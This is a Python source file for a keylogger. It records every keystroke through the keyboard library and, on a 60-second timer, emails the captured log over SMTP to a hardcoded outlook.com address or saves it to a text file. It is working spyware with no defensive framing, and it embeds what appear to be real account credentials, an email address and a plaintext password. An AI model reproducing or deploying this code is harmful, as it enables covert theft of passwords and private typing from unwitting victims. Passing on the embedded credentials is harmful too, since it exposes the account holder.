import keyboard
import smtplib 
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "venkateshishan@outlook.com"
EMAIL_PASSWORD = "Singer2020!"


class Keylogger:
    def __init__(self, interval, report_method="email"):

        self.interval = interval
        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    
    def callback(self, event):
        name = event.name

        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]/n"
        elif name == "decimal":
            name = "."
        
        self.log += name
    

    def update_filename(self):

        self.filename = "keylogger"
    

    def report_to_file(self):

        with open(f"{self.filename}.txt", "w") as keyloggerfile:
            print(self.log, file=keyloggerfile)
        
        print(f"[+] Saved {self.filename}.txt")
    

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    
    def send_mail(self, email, password, message, verbose=1):

        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)

        server.sendmail(email, email, self.prepare_mail(message))

        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")

    
    def report (self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.send_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        

